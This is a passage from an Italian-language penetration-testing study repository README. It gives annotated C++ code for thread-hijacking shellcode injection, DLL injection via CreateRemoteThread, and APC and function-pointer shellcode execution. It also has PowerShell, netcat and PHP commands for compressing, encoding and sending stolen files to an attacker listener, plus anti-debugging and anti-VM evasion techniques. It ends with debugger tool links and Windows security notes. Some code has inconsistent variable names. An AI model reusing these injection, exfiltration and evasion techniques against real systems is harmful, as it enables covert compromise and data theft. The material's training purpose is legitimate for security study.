FALSE, #campo che imposta l'ereditarietà a false 
processId  #campo che registra il PID del processo
);

remoteBuffer = VirtualAllocEx(
hProcess, #campo che apre il processo con l'handle
NULL, #campo che specifica l'indirizzo di partenza con il valore NULL è SO che decide
sizeof shellcode, #grandezza da allocare per la memoria
(MEM_RESERVE | MEM_COMMIT), #campi che prima riservano la memoria e poi la rendono accesibile
PAGE_EXECUTE_READWRITE #campo che specifica i permessi quali lettura, scritture e esegui
);

WriteProcessMemory(
processHandle, #campo che passa l'handle
remoteBuffer, #campo che passa la memoria allocata
shellcode, #campo che indica lo shellcode da scrivere
sizeof shellcode, #campo che indica la grandezza
NULL
);
```
_Ora va identificato il thread target andando a cercare il suo threadID_
```c++
THREADENTRY32 threadEntry; #dichiarazione di una struttura thread, che verrà utilizzata per contenere delle informazioni

HANDLE hSnapshot = CreateToolhelp32Snapshot( #funzione che crea uno snapshot delle informazioni riguardanti i thread o processi nel sistema 
	TH32CS_SNAPTHREAD, #campo che indica di volere fare lo snapshot ai thread
	0 #campo che indica di voler prendere il processo corrente
);
Thread32First( #funzione che prende il primo thread dello snapshot
	hSnapshot, #campo che indica l'handle del processo
	&threadEntry #campo puntatore alla struttura thread
);

while (Thread32Next( #comando che prende il prossimo thread
	snapshot, #campo che indica l'handle del processo
	&threadEntry  #campo puntatore alla struttura thread
)) {
```
_Adesso è necessario aprire il thread, metterlo in sospensione, prendere il suo contenuto e modificare il registro RIP in modo che punti alla regione di memoria contenente il codice malevolo_
```c++
if (threadEntry.th32OwnerProcessID == processID) #codice ce verifica se l'ID all'interno della stutture thread è uguale all'ID specificato
		{
			HANDLE hThread = OpenThread(
				THREAD_ALL_ACCESS, #campo che indica di volere tutti i diritti sul thread
				FALSE, #campo che settato a FALSE indica che i thread figli non ereditano dal padre
				threadEntry.th32ThreadID #campo che indica l'ID del thread all'interno della struttura
			);
			break;
		}

SuspendThread(hThread); #funzione per sospendere il thread

CONTEXT context; #variabile che registra il contenuto
GetThreadContext(
	hThread, #campo che punta all'handle del thread
	&context #campo puntatore al contenuto della struttura
);

context.Rip = (DWORD_PTR)remoteBuffer; #codice che fa puntare il RIP alla zona di memoria del codice malevolo
```
_Infine aggiorniamo il contenuto del thread corrente con quello della struttura create e cambiamo da sospeso ad attivo il thread_
```c++
SetThreadContext(
	hThread, #campo con l'handle del thread a cui copiare il contenuto
	&context #campo puntatore al contenuto della struttura thread
);

ResumeThread(
	hThread #campo che indica l'handle del thread da riattivare
);
```
- __DLL Injection:__

_Primo passo trovare il processo target_
```c++
DWORD getProcessId(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot( #funzione che crea uno snapshot delle informazioni riguardanti i thread o processi nel sistema 
		TH32CS_SNAPTHREAD, #campo che indica di volere fare lo snapshot ai thread
		0 #campo che indica di voler prendere il processo corrente
		);
    if (hSnapshot) {
	PROCESSENTRY32 entry; #campo che definisce la struttura thread di nome entry
	entry.dwSize = sizeof(PROCESSENTRY32); #campo che ottiene le dimensioni delle struttura
	if (Process32First( #funzione che prende il thread del primo processo
					hSnapshot, #campo handle dello snapshot
					&entry #campo puntatore alla struttura
				)) {
	    do {
		if (!strcmp(entry.szExeFile,processName))  { #if di confronto tra i processi per cercare quello target 
		    return entry.th32ProcessID; #ritorno del process ID cercato se si ha successo
		}
	    } while (Process32Next(hSnapshot, &entry)); #ciclo while che continua finchè non è stato esaminato tutto lo snapshot
	}
    }

DWORD processId = getProcessId(processName); #variabile che ritorna l'ID del processo cercato
```
_Continuiamo andando ad aprire il processo target, allocare memoria per la DLL malevola, scriverci ed infine caricarla ed eseguirla_
```c++
HANDLE hProcess = OpenProcess(
	PROCESS_ALL_ACCESS, #campo che indica di volere tutti i diritti
	FALSE, #campo che settato a FALSE non permette l'ereditarietà ai processi figli
	processId #campo che registra il processID target
);

LPVOID dllAllocatedMemory = VirtualAllocEx(
	hProcess, #campo handle del processo target
	NULL, 
	strlen(dllLibFullPath), #campo con la grandezza della DLL path
	MEM_RESERVE | MEM_COMMIT, #campo reserve e commit della memoria
	PAGE_EXECUTE_READWRITE #campo che attiva lettura,scrittura e eseguibilità sulle pagine virtuali
);

WriteProcessMemory(
	hProcess, #campo handle del processo target
	dllAllocatedMemory, #campo indicante la memoria allocata
	dllLibFullPath, #campo contenente la path alla DLL malevola
	strlen(dllLibFullPath) + 1, #campo contente la grandezza della DLL malevola
	NULL
);


LPVOID loadLibrary = (LPVOID) GetProcAddress( #funzione per ottenere un puntatore alla API call da importare
	GetModuleHandle("kernel32.dll"), #campo contenente l'handle della libreria
	"LoadLibraryA" #campo della API call da importare
);
HANDLE remoteThreadHandler = CreateRemoteThread(
	hProcess, #campo che indica l'handle del processo target
	NULL, #campo che indica le impostazioni predefinite per la dimensione dello stack
	0, #campo che indica la dimensione predefinita dello stack
	(LPTHREAD_START_ROUTINE) loadLibrary #campo puntatore alla funzione importata
	dllAllocatedMemory, #campo puntatore alla memoria allocata
	0, #campo che indica l'esecuzione immediata
	NULL #campo che settato a NULL non specifica parametri di sicurezza
);
```
- __Esecuzione alternative in memoria:__

1) _Puntatori di Funzione:_

_I puntatori di funzione permettono l'esecuzione solo a memoria allocata localmente e non fanno affidamento su nessuna API call_

_Esempio e spiegazione:_
```c++
(void(*)() #codice che crea un puntatore di funzione

(/puntatore a funzione/)addressPointer) #codice che casta addressPointer che può essere un puntatore di memoria o un array shellcode a puntatore di 
funzione

(); #codice che invoca la funzione per eseguire lo shellcode

((void(*)())addressPointer)(); #codice completo
```
2) _Chiamate a procedure asincrone:_

_Le chiamate a procedure asincrone sono funzioni che si eseguono in maniera non sincrona nei thread_

_Codice:_
```c++
QueueUserAPC( #funzione che inserisce un procedura asincrona nella coda di un thread specifico
	(PAPCFUNC)addressPointer, #campo puntatore alla procedura asincrona
	pinfo.hThread, #campo handle del thread
	(ULONG_PTR)NULL #campo NULL
	);

ResumeThread( #funzione che riattiva un thread in sospeso
	pinfo.hThread #campo handle del thread
);

WaitForSingleObject( #funzione che fa attendere il thread
	pinfo.hThread, #campo handle del thread
	INFINITE #campo che indica l'attesa in questo caso INFINITE indica di attendere fino a che il thread non termina 
);
```
##### Tecniche di esfiltrazione:

_Nello shellcode ma anche più generale i malware esfiltrano dati, in fase di pentesting può essere utile esfiltrare dati perchè possano essere visionati in un secondo momento._

- __TCP Socket:__

_Il più generico metodo d'esfiltrazione è tramite un socket TCP, la nostra machine sarà in ascolto per i dati in arrivo mentre dalla target machine eseguiamo i comandi per prendere i dati_

_Comandi:_
```powershell
nc -lvp <porta> > <path dove salvare i dati ricevuti> #comando per aprire il listener e poi salvare i dati
```
```powershell
Compress-Archive -Path "<path file da zippare>" -DestinationPath "<path file dove salvarlo>" #comando per zippare il file da inviare
```
```powershell      
$base64Data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("<path file zip>")) #comando per encodare i bytes in base64
```
```powershell      
Invoke-WebRequest -Uri "<url target machine>" -Method POST -Body $base64Data #comando per inviare i dati alla nostra target machine
```
- __SSH:__

_Tramite una connessione SSH è possibile esfiltrare i dati, ed essendo tramite SSH la connessione sarà criptata_

_Comandi:_
```powershell
Import-Module SSH-Sessions #comando che importa il modulo SSH se non presente
```
```powershell     
$sshInfo = @{ #comando che una hashtable con le informazioni per loggare con SSH
ComputerName = "<indirizzo ip>" 
Port = <porta>
Credential = Get-Credential #comando che registra le credenziali se presenti per l'accesso  
}
```
```powershell
$session = New-SSHSession @sshInfo #comando che stabilisce la connessione
```
```powershell
Invoke-SSHCommand -SSHSession $session -Command "<comando alla target machine>" #comando che invia tramite SSH un comando
```
ES: `Invoke-SSHCommand -SSHSession $session -Command "<nc -lvp 8080 > /tmp/file1.data>"`
```powershell      
Compress-Archive -Path "<path file da zippare>" -DestinationPath "<path file dove salvarlo>" Optimal #comando per zippare il file da inviare
```
```powershell
$base64Data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("<path file zip>")) #comando per encodare i bytes in base64
```
```powershell      
Invoke-WebRequest -Uri "<url target machine>" -Method POST -Body $base64Data #comando per inviare i dati alla nostra target machine
```
```powershell
Remove-SSHSession -SSHSession $session #comando per chiudere la sessione SSH
```
- __HTTP POST:__

_L'esfiltrazione tramite HTTP POST può giocare a nostro vantaggio in quanto è più difficile da rilevare perchè va filtrato con il traffico HTTP legittimo_

_Comandi:_

_Nella nostra target machine abbiamo bisogno di un piccolo form in PHP che gestisca i dati inviati_
```php
<?php 
if (isset($_POST['file'])) {
 $file = fopen("<path dove salvare>","w");
 fwrite($file, $_POST['file']);
 fclose($file);
}
?> #script in PHP che ha il compito di gestire i file in arrivo e scrivere il contenuto dei dati esfiltrati nella nostra machine
```
```powershell
Compress-Archive -Path "<path file da zippare>" -DestinationPath "<path file dove salvarlo>" Optimal #comando per zippare il file da inviare
```
```powershell  
$base64Data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("<path file zip>")) #comando per encodare i bytes in base64
```
```powershell      
Invoke-WebRequest -Uri "<url target machine>" -Method POST -Body $base64Data #comando per inviare i dati alla nostra target machine, specificare il nome dello script php      
```  
##### Decompiling e Debugging:

_Il Decompiling consiste nel decompilare il codice di un .exe o di un programma, cercando di andare a capire il funzionamento interno di esso mentre il Debugging decompila sempre il codice e permette di interagire (cambiare valori ai registri, breakpoint, ecc...) con il codice stesso per vedere come reagisce_

_esistono 3 tipologie di debugger:_ 

- Debugger ad alto livello = debugger per i linguaggi ad alto livello che controllano l'esecuzione del codice e l'eventuale presenza di bug

- Debugger Assembly = debugger che recupera l'assembly di un eseguibile, dove possiamo visionare valori di memoria e dei registri

- Debugger Kernel = debugger al più basso livello possibile quello del kernel

- __Anti-Detection dello shellcode:__

_Le tecniche Anti-Detection sono utili per coprire il nostro shellcode, in modo che passi inosservato_

_Tecniche di Anti-Debugging:_

1) Controllare la presenza di un debugger = tramite la funzione __"IsDebuggerPresent"__ che controlla se un debugger è presente

2) Modifica dei registri di debug = tramite la modifica o corruzione dei logs di debug, utilizzati dal debugger per il controllo del codice

3) Codice che si automodifica = cioè codice che mentre avviato si modifica per rendere più difficile il lavoro del debugger

_Tecniche di Anti-VM:_

1) Controllo dei processi = VMWare runna un processo chiamato __"vmtools"__ mentre VirtualBox __"vboxservice"__ per vederli viene utilizzata la funzione __"EnumProces"__

2) Controllo dei software installati = alla seguente key __"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"__, possiamo verificare le presenza di debugger, decompilatori e ecc...

3) Controllo di Rete = le VM comunicando con la rete generano un loro __"MAC address"__ con i seguenti valori __"00-05-69, 00-0c-29, 00-1c-14 o 00-50-56"__ che riconoscono i vendor

4) Risorce computer = il controllo delle risorse dei computer, in quanto per una VM non viene assegnata molta RAM

5) Controllo delle periferiche = controllo delle periferiche esempio in ricerca di stampanti, una VM di solito non le monta

6) Controllo Dominio = tramite le variabili d'ambiente __"LoggonServer"__ e __"ComputerName"__, possiamo controllare se siamo sotto AD

7) Attacchi a tempo = controllo del tempo per eseguire un'istruzione in quanto in una macchina fisica è più veloce rispetto in una macchina virtuale

8) Sensore temperatura = tramite il controllo della voce __"Win32_TemperatureProbe"__ settato a __"Not Supported"__ significa che non vi è il sensore della temperatura e che quindi siamo in una VM però anche macchine fisiche possono non averlo quindi va preso con le pinze 

_Tool VM:_

_Esistono 2 script che aiutano il blue teaming a nascondere la presenza della loro VM:_

1) [VMware Cloak](https://github.com/d4rksystem/VMwareCloak)

2) [VBoxCloak](https://github.com/d4rksystem/VBoxCloak)

- __Tool Debugging:__

_Esistono molti programmi con la funzione di debugger tra cui:_

1) [Ghidra](https://github.com/NationalSecurityAgency/ghidra/releases)

2) [gdb](https://www.sourceware.org/gdb/download/)

3) [dnSpy](https://github.com/dnSpy/dnSpy)

__N.B: Il nostro parere è di sceglierlo in base alla comodità e usabilitò__

### Note sulla sicurezza in Windows

_SID(Security Identifier) aggiunto a utente,gruppi,domini o a qualsiasi altro entità di sicurezza, viene utilizzato per gestire l'accesso alle risorse_

ES:
_S-1-5-21-674899381-4069889467-2080702030-1002_

_SAM(Security account manager) database interno che contiene le informazioni dei vari utenti come password, hash e nomi utenti, è utilizzato dal LSA(lsass.exe) per l'autenticazione._

_ACL(Access control list) e ACE (Access control entrie) le ACE le troviamo dentro l'ACL, le ACE possono avere diverse regole come: deny o allow e si applicano su risorse e utenti._

_Local group policy utilizzato per le policy di sicurezza dei gruppi._

_MMC(Microsoft management console) interfaccia gui che permette di aggiungere degli snaps-in(moduli) che estendono le funzionalità del MMC che ha il compito di monitorare risorse hardware e software._

_WMI è un sottosistema di powershell, che fornisce informazioni dettagliate sul sistema operativo, l'hardware, il software e altre risorse del computer per il system monitoring, fa da framework comune perchè presente sulle varie versioni di Windows_

# Credits:

_Molte informazioni inerenti a questa repo non sono state prese dal nulla, ma sono l'insieme di varie macchine, room e moduli teorici svolti nei seguenti siti:_

- [HackTheBox-Academy](https://academy.hackthebox.com/)

- [TryHackMe](https://tryhackme.com/)

_Inoltre vorrei ringraziare il mio amico [Disturbante](https://github.com/Disturbante) per il suo contributo alla sezioni di:_

- [Comandi info generali pc](./#comandi-info-generali-pc)

- [Comandi per i file](./#comandi-per-i-file)

- [Comandi ADS](./#comandi-ads-alternate-data-stream)

- Alcune sezioni di [Privilege Escalation](./#privilege-escalation)

- [Powerview](./#Powerview)

- [Bloodhund](./#bloodhund)

- [Recognition Attiva](./#attiva)

- Correzione e miglioramenti generali dell'intera repository
